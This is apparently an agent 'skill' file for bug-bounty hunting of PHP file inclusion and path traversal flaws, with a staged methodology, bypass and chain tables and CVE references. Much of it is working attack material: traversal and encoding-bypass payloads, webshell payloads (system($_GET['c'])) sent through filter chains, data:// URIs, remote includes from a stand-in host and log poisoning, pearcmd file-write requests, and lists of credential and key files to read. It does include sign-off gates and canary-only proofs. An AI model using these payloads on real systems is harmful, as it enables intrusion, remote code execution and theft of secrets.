---
name: hunt-lfi
description: "Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal — /etc/passwd read, log poisoning → RCE, PHP filter-chain RCE (no upload needed), php:// / data:// / zip:// / phar:// wrappers, RFI via allow_url_include, directory traversal read/write/delete, pearcmd.php config-create RCE on containerised PHP, and PHP_SESSION_UPLOAD_PROGRESS to force a controlled session file when no writable path is known. Covers OOB/blind LFI confirmation and false-positive discipline. Use when hunting file-include or path-traversal bugs on any target."
sources: hackerone_public, synacktiv_research, portswigger_research, hacktricks_coverage_checklist, php_documentation, php_src, watchtowr_research, orange_tsai_research, leavesongs_research
report_count: 24
---

# HUNT-LFI — Local / Remote File Inclusion & Path Traversal

## Crown Jewel Targets

LFI that reaches code execution is Critical. Pure file-read is High when it exposes secrets (`.env`, `wp-config.php`, private keys, cloud creds), Medium when it only reads non-sensitive files.

**Highest-value chains (in rough order of reliability in 2026):**
- **PHP filter-chain → RCE** — the modern default. A bare `php://filter` *file-read* primitive is upgraded to RCE with **no upload endpoint and no writable file** by chaining `iconv` conversions to forge an arbitrary PHP payload in-memory (Synacktiv, 2022). See the dedicated section below. This is the single most impactful thing to try and the most-missed.
- **Log poisoning → RCE** — inject PHP into an Apache/Nginx log (User-Agent / URL path), then include the log. Increasingly blocked by `open_basedir` and unreadable log perms, so verify the log is *readable* first.
- **PHP wrappers → source disclosure** — `php://filter/convert.base64-encode/resource=index.php` leaks source; read source to find more LFI sinks, secrets, and the include base path.
- **RFI → RCE** — when `allow_url_include=On`, `?file=http://OOB/shell.txt` pulls and executes remote code. Rare on modern configs but trivially Critical when present.
- **phar:// deserialization** — a crafted PHAR + any unserialize-on-metadata sink → object-injection RCE.
- **zip:// / data:// chains** and **session/upload poisoning** when filters block wrappers.

---

## OOB / Blind-LFI Confirmation Gate (Read First)

LFI is frequently **blind**: the included content is parsed/executed but never reflected, or the page swallows the file into a template you can't see. Do **not** claim LFI from indirect signals alone.

### What is NOT confirmation
- A different status code or error string for `../../etc/passwd` vs a normal value. The app may be string-matching `../` and returning a canned 403/500 without ever touching the filesystem.
- Your input **echoed back** inside an error message (e.g. `failed to open '/var/www/../../etc/passwd'`). That is the path *formatter*, not proof the file was read. A genuine read shows file **contents**, not your path.
- A page that "looks different." Reflected-input or WAF block pages produce diffs unrelated to a real read.

### What IS confirmation
- **Direct read:** actual file *contents* appear (real `root:x:0:0:` line, real PHP source after base64-decoding the filter output).
- **Blind read via OOB exfil:** use a php://filter or XXE-style chain whose payload performs a DNS/HTTP callback to your **Burp Collaborator** subdomain, or use an `expect://` / wrapper that triggers an outbound request. A unique-per-sink Collaborator hit (DNS + HTTP, with the server's source IP) proves the include ran.
- **Blind read via differential/timing:** include a file you *know* exists and is large (`/etc/passwd`) vs one that does not (`/etc/passwd_nope_<rand>`). Stable, repeatable response-length or latency delta = real filesystem access. Confirm with a third known-good path to rule out coincidence.

### Default workflow
1. Pick a **unique marker** target: prefer a file whose content you can fingerprint exactly (`/etc/passwd` → grep `^root:`). For blind, use a php://filter base64 read and decode — partial/truncated base64 still decodes to recognizable source.
2. Generate a sub-tagged Collaborator payload per sink (`lfi-page.<collab>`, `lfi-tpl.<collab>`) so callbacks identify which parameter fired.
3. Send, wait 30–120s, poll OOB.
4. Claim LFI **only** after a content match, a Collaborator callback, or a stable triple-confirmed timing/length delta. Echoed paths and lone status-code changes are retracted.

---

## Attack Surface Signals

### URL / Body Parameters
```
?page=  ?file=  ?path=  ?template=  ?view=  ?lang=  ?module=
?include=  ?doc=  ?load=  ?read=  ?content=  ?theme=  ?layout=
?component=  ?download=  ?img=  ?pdf=  ?report=  ?style=  ?dir=
JSON bodies: {"filename":...} {"template":...} {"path":...}
```

### Technology Stack Signals
| Signal | Vector |
|--------|--------|
| PHP (`X-Powered-By`, `.php`, PHPSESSID) | php:// filter-chain RCE, phar://, zip://, data:// |
| Apache/Nginx logs readable | Log poisoning → RCE (verify readability first) |
| Apache 2.4.49 / 2.4.50 (`Server:` banner) | CVE-2021-41773 / CVE-2021-42013 traversal → RCE |
| PHP-CGI on Windows (XAMPP, `php-cgi.exe`) | CVE-2024-4577 arg-injection → RCE |
| Java servlet (`/WEB-INF/`) | `WEB-INF/web.xml`, `classes/`, `application.properties` |
| Python Flask/Django | `/proc/self/environ`, `settings.py`, `SECRET_KEY` |
| Node.js file-serve / `res.sendFile`, `express.static` | path-traversal read, `require()` traversal |
| Windows IIS / .NET | `..\..\web.config`, `C:\Windows\win.ini`, machineKey |
| Official PHP Docker image (no `php.ini` in `/usr/local/etc/php/`) | `pearcmd.php` → RCE (Phase 8c): PEAR present and `register_argc_argv` at its On default |
| PHP with `session.use_strict_mode=0` and `save_handler=files` | `PHP_SESSION_UPLOAD_PROGRESS` → controlled session file (Phase 8d) |

---

## Step-by-Step Methodology

### Phase 1 — Identify Candidates
```bash
cat recon/$TARGET/urls.txt | gf lfi > recon/$TARGET/lfi-candidates.txt
grep -E "(\?|&)(page|file|path|template|view|lang|module|include|doc|load|read|content|download|img|pdf|report|dir)=" \
  recon/$TARGET/urls.txt
ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
```

### Phase 2 — Path Traversal (read)
```bash
?file=../../../etc/passwd
?file=....//....//....//etc/passwd            # ../ stripping once → ....// survives
?file=..%2f..%2f..%2fetc%2fpasswd             # single URL-encode
?file=..%252f..%252f..%252fetc%252fpasswd     # double encode (decoded twice server-side)
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd          # encode dots too
?file=/etc/passwd%00.png                      # null byte — PHP < 5.3.4 only
?file=....\/....\/etc\/passwd                  # mixed slash
# Prefix-forced base (app prepends /var/www/): pad with extra ../, or absolute path if no prefix
# UTF-8 overlong: %c0%ae%c0%ae%2f  (legacy servers)
```
```bash
# Windows
?file=..\..\..\windows\win.ini
?file=..%5c..%5c..%5cwindows%5cwin.ini
?file=C:\inetpub\wwwroot\web.config
```

### Phase 3 — PHP Wrappers (source disclosure)
```bash
?file=php://filter/convert.base64-encode/resource=index.php   # decode base64 → source
?file=php://filter/read=string.rot13/resource=config.php
?file=php://filter/convert.base64-encode/resource=../app/Config.php
# Always base64-encode source reads: raw <?php ... ?> is parsed/swallowed and you see nothing.
```

### Phase 4 — PHP Filter-Chain → RCE (no upload, no writable file)
The modern flagship technique (Synacktiv, 2022). If you have a `php://`-capable LFI that *reads* a file, you can also *execute* attacker-chosen PHP. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged — then `include()` runs it. **No upload endpoint, no log access, no writable path required.**

```bash
# Generate the chain (public tool, no CVE — it abuses documented iconv behaviour):
#   git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Tool prints a long php://filter|convert.iconv.*|...|resource=php://temp string.
# Drop it into the sink:
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...<long-chain>...|convert.base64-decode/resource=php://temp&c=id
```
Notes / gotchas:
- Requires the include sink to accept the `php://filter` scheme (most LFI sinks calling `include`/`require`/`file_get_contents` on the param do).
- Payloads get **long** (10–50KB). If the param is length-capped or WAF-blocked on size, move it to a POST body, or use a minimal payload (`<?=`shorthand`?>`).
- For blind targets, set the chain payload to a Collaborator callback (`<?php file_get_contents("http://x.<collab>/".`id`);?>`) to confirm execution OOB.
- This works even when log poisoning fails (unreadable logs, `open_basedir`). Try it whenever you have a php:// filter read.

### Phase 5 — Code-Execution Wrappers (config prerequisites)
```bash
# data:// — executes inline; REQUIRES allow_url_include=On
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   # <?php system($_GET['c']);?>

# php://input — body is treated as the included resource; ALSO REQUIRES allow_url_include=On
#   POST ?file=php://input    body: <?php system($_GET['c']); ?>
#   (Same prerequisite as data://. Do NOT assume this works on default PHP config.)

# expect:// — direct command exec; requires the (rare) expect extension loaded
?file=expect://id
```

### Phase 6 — Remote File Inclusion (RFI)
RFI = the include target is a **remote URL**. Prerequisite: `allow_url_include=On` (and `allow_url_fopen=On`). Off by default on modern PHP, but still seen on legacy/misconfigured hosts.
```bash
# Host a payload you control, then:
?file=http://OOB-HOST/shell.txt          # shell.txt contains <?php system($_GET['c']); ?>
?file=https://OOB-HOST/shell.txt?
?file=ftp://OOB-HOST/shell.txt
# Detection without RCE: point at a Burp Collaborator HTTP URL. A callback (server IP) = the
# include fetched remotely → RFI confirmed even if execution is blocked. No callback = not RFI.
# Bypass appended extension (?file=$x.".php"): trailing ? or # to truncate, or ?file=http://OOB/shell
```

### Phase 7 — Log Poisoning → RCE
```bash
# Step 1: inject PHP into a log the include can read
curl -s "https://$TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
# Step 2: include it (verify the log is readable first — read it plain before poisoning)
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/nginx/access.log&c=id
?file=/proc/self/fd/0&c=id                  # stdin fd (varies)
# Candidate logs: /var/log/apache2/access.log /var/log/httpd/access_log
#   /var/log/nginx/access.log /var/log/auth.log (SSH user poisoning) /proc/self/environ
```

### Phase 8 — Session / Upload Poisoning
```bash
# PHP session: set payload in a stored field (username/profile), then include the session file
?file=/var/lib/php/sessions/sess_<PHPSESSID>&c=id
?file=/tmp/sess_<PHPSESSID>&c=id
# phar:// object injection (needs an unserialize-on-metadata sink + any file upload):
?file=phar:///var/www/uploads/evil.jpg     # JPEG magic bytes prepended to a PHAR
# zip:// — archive containing the target, or a symlink to /etc/passwd
?file=zip:///var/www/uploads/a.zip%23path/inside.txt
```

### Phase 8b — Archive-extraction & image-processing sinks (no `?file=` needed)
Two LFI/traversal surfaces that are not query-parameter file reads:
- **Zip Slip / tar-symlink escape** — a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../../../etc/cron.d/x`, or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the upload dir. Disclosed: reports/1439593, reports/733072, reports/822262.
- **ImageMagick coder read-sink** — image convert/thumbnail/avatar features read local files via MSL/MVG coders even with no file parameter: filename/label `label:@/etc/passwd`, or an MSL payload (`<image xlink:href="msl:/etc/passwd">`) plus `msl:`/`ephemeral:` pseudo-protocols (ImageTragick CVE-2016-3714 family). Disclosed: reports/1858574. Pairs with `hunt-file-upload`.

### Phase 8c — `pearcmd.php` → RCE (containerised PHP, no upload endpoint)
A pure *read* LFI becomes **code execution** by including a PHP file that is
already on disk and that takes its arguments from the query string. PEAR's
command-line front end is that file. This achieves RCE, so the write step is
**Stage B** and needs explicit RCE-attempt sign-off.

**Why it works, and the exact preconditions:**
- **The gadget file.** `/usr/local/lib/php/pearcmd.php` is present on the
  official PHP Docker images, which configure PHP `--with-pear`. PEAR shipped by
  default up to PHP 7.3; from 7.4 on it needs that explicit configure flag,
  which the `docker-library/php` images set. On a Debian or Ubuntu host the
  package path differs, so confirm the path by reading it (Stage A below) rather
  than assuming.
- **`register_argc_argv` must be On.** Its compiled default is `1`.
  `php.ini-production` ships the line commented out as
  `;register_argc_argv = Off`, and the official images copy `php.ini-*` into
  `/usr/local/etc/php/` **without activating either file**, so no `php.ini`
  exists and the On default applies. That is the real reason containers are the
  target and a hardened host usually is not. Deprecated for non-CLI SAPIs as of
  **PHP 8.5.0** (an `E_DEPRECATED` is raised), so expect this to decay.
- **How the query string becomes `$argv`.** In php-src,
  `php_auto_globals_create_server()` calls
  `php_build_argv(SG(request_info).query_string, ...)` when
  `PG(register_argc_argv)` is on and `SG(request_info).argc` is 0.
  `php_build_argv` splits the **raw** query string on `+` and has **no check for
  `=`**. PEAR's `Console_Getopt::readPHPArgv()` then falls back to
  `$_SERVER['argv']`. (The common claim that the parameter must contain no `=`
  describes RFC 3875's indexed-query rule, which PHP does not follow here.)
- **`config-create` is the write primitive.** It reaches PEAR's
  `writeConfigFile()`, which serialises config data to a path given on the
  command line. The attacker's PHP source rides along inside that file's
  contents.

```bash
# Stage A — detection only. Two independent reads, no write, no execution.
# (a) Read the gadget through the filter from Phase 3.
?file=php://filter/convert.base64-encode/resource=/usr/local/lib/php/pearcmd.php
# Base64 decoding to PEAR CLI source → gadget present, Stage B is viable.
# An empty or garbage decode is INCONCLUSIVE, not negative: php://filter must
# lead the string, so a sink that prepends a base dir cannot be reached this way
# and ../ padding does not help. Only treat it as negative if a Phase 3 filter
# read already works on this same sink.
#
# (b) Fallback fingerprint when the sink prepends a base dir: include pearcmd
# with NO '+' arguments and look for PEAR's command list. Verified on
# php:8.3-cli, it begins:
#   Commands:
#   build                  Build an Extension From C Source
#   bundle                 Unpacks a Pecl Package
#   channel-add            Add a Channel
?file=../../../../../../usr/local/lib/php/pearcmd.php
# Save the unmodified response body as the Stage B diff baseline.
```

```bash
# Stage B — ONLY with explicit written RCE-attempt sign-off.
# The written file must be canary-only. NEVER a webshell: a file left in /tmp
# that evaluates POST data is a backdoor you installed on the client's host.
#
# The canary must be a TRANSFORM, not a literal. The payload text ends up in the
# written file as plain source, so a readfile()/file_get_contents() sink echoes a
# literal canary back without executing anything. md5() of the canary can only
# appear if the code actually ran.
CANARY="LFIP$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
EXPECT=$(printf '%s' "$CANARY" | md5sum | cut -d' ' -f1)   # computed locally
# Step 1 — write /tmp/cbh_<rand>.php. The raw query string is split on literal
# '+', so argv becomes ["", "config-create", "<root-dir carrying the PHP
# source>", "<output path>"] and PEAR serialises the root dir into the file.
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=md5('$CANARY')?>+/tmp/cbh_$CANARY.php
# Step 2 — include what was written.
GET /index.php?file=/tmp/cbh_$CANARY.php
# Confirmed RCE requires ALL THREE:
#   1. $EXPECT (the digest) present in the step-2 body;
#   2. the literal string "<?=" ABSENT from that body — its presence means the
#      sink printed the file instead of executing it, which is file read, not RCE;
#   3. $EXPECT absent from the Stage A baseline.
# The written file is a PEAR config blob, so the digest appears inside a
# serialized structure whose s:<n>: length prefixes no longer match. That is
# expected and is itself evidence the value was substituted at runtime.
```
Notes / gotchas:
- The split happens on the **raw** query string, so `+` must arrive as a literal
  `+` and the `<?= ... ?>` must not be percent-encoded. Use Burp Repeater or
  `curl -g` with the URL quoted. A browser address bar re-encodes and the
  payload silently fails.
- When the sink appends `.php` (`include($x.".php")`), drop the extension from
  both paths: include `.../php/pearcmd` and write `/tmp/<name>.php`, then
  include `/tmp/<name>`. This is the Form Tools 3.1.1 shape documented by
  watchTowr.
- **Persistence you must report.** The written file survives until `/tmp` is
  cleared. Give the owner the exact path in the report so it can be deleted, and
  use a random name so it is attributable to you and not reusable by anyone else.

### Phase 8d — `PHP_SESSION_UPLOAD_PROGRESS` (forcing a file to exist)
When no writable path is known and no upload endpoint exists, PHP's upload
progress feature will create a session file **with attacker-controlled content**
even though the application never started a session. Reaching code execution
through it is **Stage B**.

Preconditions, each verifiable and each a hard stop if wrong:

| Setting | Default | Why it matters |
|---|---|---|
| `session.upload_progress.enabled` | `"1"` | Off means no progress entry is ever written. |
| `session.upload_progress.name` | `"PHP_SESSION_UPLOAD_PROGRESS"` | The multipart field name that triggers it. |
| `session.upload_progress.prefix` | `"upload_progress_"` | Prepended to your value, so the file does **not** start with your bytes. |
| `session.upload_progress.cleanup` | `"1"` | Progress data is deleted once the POST is fully read. This is what makes it a race. |
| `session.use_strict_mode` | `"0"` | **If this is `1` the technique is dead**: PHP refuses an uninitialised session id and issues its own, so you cannot predict the filename. |
| `session.save_handler` | `"files"` | Redis or memcached means there is no session *file* to include. |

```bash
# Stage A — detection only. The signal is "a session file EXISTS for a
# session id I chose", compared against a control id I never sent. It must be a
# multipart upload, and the progress field must come BEFORE the file part; a
# plain -d form field does NOT create the file.
#
# Important: with cleanup=On (the default), the progress entry is zeroed the
# instant the POST finishes, so a SEQUENTIAL read-back sees an empty file, not
# your content. Verified on php:8.3-cli: after the request, sess_<CANARY> exists
# but is 0 bytes. So Stage A proves EXISTENCE, not content retrieval. Reading
# content back is the Stage B race below.
CANARY="LFIS$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
head -c 4096 /dev/urandom > /tmp/cbh_probe.bin   # a real, non-empty file part
curl -s "https://$TARGET/" -H "Cookie: PHPSESSID=$CANARY" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=$CANARY" -F "file=@/tmp/cbh_probe.bin"
# Then probe for the two files through the filter from Phase 3:
?file=php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_<CANARY>
?file=php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_<CANARY-never-sent>
# Candidate save paths: /var/lib/php/sessions/  /var/lib/php5/sessions/  /tmp/
# The chosen id resolves to a readable (if empty) file while the control id does
# not. That existence differential is a reportable file-write-primitive finding
# on its own, independent of winning the content race.
```

```bash
# Stage B — ONLY with explicit written RCE-attempt sign-off. Canary-only payload.
# Hold the race window open with ONE slow large multipart upload rather than a
# flood: concurrency max 2, max 20 attempts, then stop. A request flood against
# a PHP-FPM pool is a denial of service, not a proof.
#   part 1: PHP_SESSION_UPLOAD_PROGRESS=<?=md5('<CANARY>')?>
#   part 2: a multi-megabyte file, uploaded slowly, to keep the entry alive
# While it is in flight, include the session file in a second request.
# Same three-part confirmation as Phase 8c: the md5 digest present, the literal
# "<?=" absent, the digest absent from the baseline. A transform, never a
# webshell: the goal is to prove execution once, not to leave a runnable file.
```
Notes / gotchas:
- `include` executes `<?php` or `<?=` found **anywhere** in the file, so the
  `upload_progress_` prefix is harmless and the triple-base64 prefix-stripping
  trick from the original HITCON challenge is only needed when the loader
  additionally requires the content to *begin* with a given string.
- With `cleanup=On` (the default) the entry vanishes as soon as the POST is
  fully read, which is why the slow upload matters. If `cleanup` has been turned
  off, the file persists and there is no race at all.
- An Nginx or other proxy that buffers the request body hides the upload from
  PHP until it completes, which also kills the technique.

### Phase 8e — deliberately out of scope (no-writable-path family)
Several further LFI-to-RCE routes exist for the same "no writable path known"
problem and are **excluded from this skill on purpose**, because each one is a
denial of service, a request flood, or a tight race against a production
target: the `phpinfo()` temp-file race, the Nginx `client_body_temp` descriptor
race, the segmentation-fault temp-file retention trick, the "eternal waiting"
filename brute force, the `compress.zlib` + `PHP_STREAM_PREFER_STDIO`
path-disclosure race, and the generic temp-file-upload filename brute force.
Phases 8c and 8d cover the same gap without flooding anything. If a scope
genuinely requires one of them, that is a separate
conversation with the operator and a separate sign-off, not a step in a hunt.

### Phase 9 — Automation (then manual-confirm everything)
```bash
ffuf -u "https://$TARGET/page.php?file=FUZZ" -w ~/wordlists/lfi.txt -mc all -fr "not found"
wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt --hh <baseline-len> \
  "https://$TARGET/page.php?file=FUZZ"
dotdotpwn -m http -h $TARGET -o unix
# Burp: Intruder over the bypass table; Collaborator for blind/RFI confirmation.
```

---

## Named CVEs / Public Techniques (grounding)

Verified, correctly-attributed references for the patterns above:
- **PHP filter-chain to RCE** — Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. The reason a bare file-read upgrades to Critical.
- **CVE-2021-41773** — Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) → file read, and RCE when `mod_cgi` is enabled.
- **CVE-2021-42013** — Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) → traversal/RCE.
- **CVE-2024-4577** — PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE.
- **`pearcmd.php` → RCE (Phase 8c)** — not a CVE; an abuse of PEAR's CLI front end plus PHP's own `register_argc_argv` behaviour. Grounding: [leavesongs, Docker PHP LFI getshell](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html) (original), [watchTowr on Form Tools 3.1.1](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) (the extension-appended variant), php-src `main/php_variables.c` (`php_build_argv` splits the raw query string on `+`), [PHP core ini directives](https://www.php.net/manual/en/ini.core.php) (`register_argc_argv` default and the 8.5.0 deprecation), and the [`docker-library/php`](https://github.com/docker-library/php) Dockerfiles (`--with-pear`, no active `php.ini`).
- **`PHP_SESSION_UPLOAD_PROGRESS` (Phase 8d)** — not a CVE; documented PHP behaviour. Grounding: [PHP manual, session upload progress](https://www.php.net/manual/en/session.upload-progress.php) and [session configuration](https://www.php.net/manual/en/session.configuration.php) for every default in the table, plus [Orange Tsai's HITCON 2018 one-line-PHP challenge](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/) for the original technique and the cleanup race.
- Coverage for Phases 8c-8e was checked against the HackTricks `pentesting-web/file-inclusion` pages (<https://github.com/HackTricks-wiki/hacktricks>, CC BY-NC 4.0), used as a checklist only; the preconditions, defaults, staging and safety guidance above are written against the primary sources just listed.

> Grounding note: this skill is built from 31 disclosed LFI/path-traversal reports. When citing a specific HackerOne report in your write-up, link the exact report URL/ID you used — do **not** paraphrase a report ID from memory. A wrong ID is worse than none.

---

## Sensitive Files to Read
```
# Linux
/etc/passwd  /etc/hosts  /etc/shadow (rarely readable)
/proc/self/environ  /proc/self/cmdline  /proc/self/status
/var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
/home/*/.ssh/id_rsa  /root/.ssh/id_rsa  /root/.bash_history
/var/www/html/app/config/parameters.yml   # Symfony
.git/config  .git/HEAD  composer.json  package.json
# App / cloud secrets
/proc/self/environ  ~/.aws/credentials  ~/.docker/config.json  /run/secrets/*
# Windows / .NET
C:\Windows\win.ini  C:\inetpub\wwwroot\web.config  ..\..\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
```

---

## Bypass Table

| Filter | Bypass |
|--------|--------|
| Strips `../` once | `....//` or `..../\` (re-forms `../` after strip) |
| URL-decodes once | `%252f` (double-encode `/`), `%252e` for dots |
| Decodes once, blocks `..` | Encode dots: `%2e%2e%2f` / overlong `%c0%ae` (legacy) |
| Appends `.php` to input | `?` or `#` truncation; null byte `%00` (PHP < 5.3.4) |
| Blocks `php://` scheme | try `PHP://`, `pHp://`, or `data://` / `expect://` |
| Prepends fixed base dir | enough `../` to escape; or absolute path if no base prepend |
| Blocks `/etc/passwd` literal | path-truncation, `/etc/./passwd`, `/etc//passwd` |
| WAF on long filter-chains | move chain to POST body / minimize payload |
| Windows | `..\..\..\windows\win.ini`, `..%5c..%5c` |

---

## Chain Table

| LFI primitive | Chain to | Impact |
|---------------|----------|--------|
| `php://filter` read | **filter-chain RCE (Phase 4)** | RCE with no upload — **Critical** |
| File read | `.env` / `config.php` / `wp-config.php` | DB creds, API keys → backend takeover |
| File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |
| Remote URL include | RFI (`allow_url_include`) | direct RCE — **Critical** |
| File read + upload | phar:// / log / session poison | RCE — **Critical** |
| File read, no upload, containerised PHP | `pearcmd.php` `+config-create+` (Phase 8c) | RCE — **Critical** |
| File read, no writable path known | `PHP_SESSION_UPLOAD_PROGRESS` (Phase 8d) | file-write primitive, then RCE — **Critical** |
| Source disclosure | full app source | hardcoded secrets, new sinks, machineKey |

---

## Validation Discipline

**Direct-read proof (not a false positive):**
- Show real *contents*, not your echoed path. `/etc/passwd` must contain a literal `root:x:0:0:root:/root:` line. Diff the response against a known-good param value — the delta must be the file body, not a WAF/error page.
- For source reads, the **base64 must decode to valid PHP**. A garbage/empty decode = no real read.
- Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent) — only the real file returns content.

**Blind / OOB proof:**
- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. Require a DNS + HTTP hit with the server's source IP before claiming the include executed. Sub-tag per sink.
- Timing/length blind: triple-confirm a stable delta (known-large file vs missing file vs second known file). One-off deltas are noise — retract.

**Partial / truncated reads:**
- Templating may HTML-escape or cut the file. Use `php://filter/convert.base64-encode` so even a truncated read decodes to recognizable bytes; report exactly what you recovered, not what you assume is there.

**RCE proof:** show command output you control — `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<collab>/`). "The payload was accepted" is not RCE.

**Severity:**
- Non-sensitive file read: **Medium**
- File read exposing DB creds / API keys / private keys / cloud creds: **High**
- RCE via filter-chain / RFI / log / session / phar / CVE: **Critical**
